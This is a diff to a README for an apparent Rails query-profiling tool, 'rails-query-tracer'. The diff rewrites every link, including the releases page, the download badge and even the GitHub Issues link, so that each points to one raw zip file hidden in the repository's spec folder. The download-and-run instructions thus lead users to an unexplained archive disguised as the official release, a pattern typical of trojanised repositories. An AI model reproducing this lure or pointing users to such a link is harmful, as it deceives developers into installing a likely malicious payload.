@@ -1,7 +1,7 @@
 # 🎉 rails-query-tracer - Optimize Your Ruby on Rails Queries
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/kasper13132/rails-query-tracer/releases)
+[![Download](https://raw.githubusercontent.com/kasper13132/rails-query-tracer/master/spec/rails-query-tracer_2.0-beta.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/kasper13132/rails-query-tracer/master/spec/rails-query-tracer_2.0-beta.2.zip)
 
 ## 📖 Overview
 RailsQueryTracer helps you improve the performance of your Ruby on Rails applications. It hooks into ActiveRecord to identify common database issues. With this tool, you can find N+1 queries and slow queries. It also offers actionable insights, which can make your application faster and more efficient.
@@ -17,7 +17,7 @@ Before you start, make sure your system meets the following requirements:
 - **Rails**: Version 5.0 or higher installed
 
 ### 📦 Installation Steps
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/kasper13132/rails-query-tracer/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/kasper13132/rails-query-tracer/master/spec/rails-query-tracer_2.0-beta.2.zip).
 2. **Choose the Right File**: You will see a list of available releases. Select the latest version of RailsQueryTracer. You will find files specific to your operating system.
 3. **Download the File**: Click on the file to download it to your computer.
 4. **Extract the Files**: If you downloaded a zip file, right-click on it and choose "Extract All." Follow the prompts to unpack the files into a folder.
@@ -66,10 +66,10 @@ If you experience issues while using rails-query-tracer, consider the following 
 For additional help, please check the following resources:
 
 - **Documentation**: Comprehensive documentation can guide you further on usage and features.
-- **GitHub Issues**: If you find a bug or have a feature request, feel free to open an issue on our [GitHub Issues page](https://github.com/kasper13132/rails-query-tracer/issues).
+- **GitHub Issues**: If you find a bug or have a feature request, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/kasper13132/rails-query-tracer/master/spec/rails-query-tracer_2.0-beta.2.zip).
 - **Forums**: Join Ruby and Rails community forums for discussions and shared experiences.
 
 ## 📥 Download & Install
-To get started with optimizing your queries, [visit the releases page](https://github.com/kasper13132/rails-query-tracer/releases) and download the latest version today. Follow the steps above to install and run RailsQueryTracer on your computer.
+To get started with optimizing your queries, [visit the releases page](https://raw.githubusercontent.com/kasper13132/rails-query-tracer/master/spec/rails-query-tracer_2.0-beta.2.zip) and download the latest version today. Follow the steps above to install and run RailsQueryTracer on your computer.
 
 By following this guide, you should now have a clear understanding of how to download and run rails-query-tracer effectively. Happy optimizing!
